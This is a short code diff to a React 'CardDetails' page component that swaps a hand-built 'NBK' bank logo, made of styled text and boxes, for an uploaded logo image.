@@ -1,4 +1,3 @@
-
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -62,13 +61,11 @@ const CardDetails = () => {
         <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
           <div className="text-center mb-4 sm:mb-8">
             <div className="flex items-center justify-center mb-3 sm:mb-6">
-              <div className="flex items-center">
-                <div className="text-lg sm:text-3xl font-bold text-blue-800 ml-2 sm:ml-3">الوطني</div>
-                <div className="text-lg sm:text-3xl font-bold text-blue-600">NBK</div>
-                <div className="w-6 sm:w-10 h-4 sm:h-8 bg-blue-800 rounded ml-2 sm:ml-3 flex items-center justify-center">
-                  <div className="w-3 sm:w-6 h-2 sm:h-4 bg-white rounded-sm"></div>
-                </div>
-              </div>
+              <img 
+                src="/lovable-uploads/dd68033e-3d38-482d-ad61-28ff811e33ba.png" 
+                alt="NBK Logo" 
+                className="h-8 sm:h-12 w-auto"
+              />
             </div>
           </div>
           
